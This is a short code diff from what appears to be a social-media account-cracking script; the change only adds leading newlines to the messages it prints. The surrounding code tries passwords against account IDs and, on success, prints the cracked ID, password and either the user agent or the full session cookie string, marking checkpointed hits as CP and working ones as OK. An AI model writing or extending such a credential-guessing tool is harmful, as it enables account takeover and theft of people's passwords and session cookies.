@@ -1188,7 +1188,7 @@ def _async(idf,pwv):
 			if "checkpoint" in post.cookies.get_dict().keys():
 				cp+=1
 				print('\n')
-				statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
+				statuscp = f'\n\n[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
 				statuscp1 = nel(statuscp, width=80, style='bold yellow', title='CP')
 				cetak(statuscp1)
 				os.popen('play-audio c.mp3')
@@ -1200,7 +1200,7 @@ def _async(idf,pwv):
 				coki=ses.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print('\n')
-				statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+				statusok = f'\n\n[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
 				statusok1 = nel(statusok, width=80, style='bold green', title='OK')
 				cetak(statusok1)
 				os.popen('play-audio o.mp3')
